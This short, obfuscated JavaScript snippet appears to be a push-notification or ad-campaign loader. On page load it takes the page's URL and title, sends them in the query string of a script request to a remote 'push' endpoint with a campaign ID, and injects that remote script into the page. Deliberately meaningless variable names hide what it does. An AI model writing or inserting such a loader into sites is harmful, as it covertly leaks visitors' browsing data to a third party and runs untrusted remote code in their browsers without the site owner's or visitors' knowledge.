(function push() {
    var eiopqImePe = (function() {
        return document;
    })();
    var eiopq = (function() {
        return encodeURIComponent(eiopqImePe.location.href);
    })();

    function scriptInjection() {
        return document;
    }
    var kleite = function() {
        return 'script';
    }
    var objLoader = scriptInjection().createElement(kleite());
    objLoader.type = objLoader.type ? objLoader.type : 'text/javascript';
    if (!objLoader.async) {
        objLoader.async = !objLoader.async;
    }
    var adopkqw = (function() {
        return "?title=" + encodeURIComponent(eiopqImePe.title)
    })()
    var i = adopkqw + "&url=" + eiopq;
    objLoader.src = initSrcComponent();
    var qs = document.querySelector('script');

    function initSrcComponent() {
        return 'https://api.adscout.space/campaign/29b37606-8af2-4bfe-830c-e97f738e88dd/push' + i;
    }
    qs.parentNode.insertBefore(objLoader, qs);
})();